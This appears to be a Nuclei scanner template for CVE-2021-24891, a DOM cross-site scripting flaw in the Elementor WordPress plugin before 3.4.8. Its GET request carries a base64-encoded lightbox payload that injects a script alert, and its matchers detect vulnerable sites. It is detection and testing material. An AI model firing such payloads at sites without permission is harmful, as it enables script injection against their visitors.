id: CVE-2021-24891

info:
  name: Elementor < 3.4.8 - DOM Cross-Site-Scripting
  author: dhiyaneshDk
  severity: medium
  description: The Elementor Website Builder WordPress plugin before 3.4.8 does not sanitise or escape user input appended to the DOM via a malicious hash, resulting in a DOM Cross-Site Scripting issue.
  reference:
    - https://www.jbelamor.com/xss-elementor-lightox.html
    - https://wpscan.com/vulnerability/fbed0daa-007d-4f91-8d87-4bca7781de2d
    - https://nvd.nist.gov/vuln/detail/CVE-2021-24891
  tags: cve,cve2021,dom,xss,wordpress,wp-plugin,elementor

requests:
  - method: GET
    path:
      - '{{BaseURL}}/#elementor-action:action=lightbox&settings=eyJ0eXBlIjoibnVsbCIsImh0bWwiOiI8c2NyaXB0PmFsZXJ0KCd4c3MnKTwvc2NyaXB0PiJ9'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "data-elementor-settings="

      - type: word
        part: header
        words:
          - "text/html"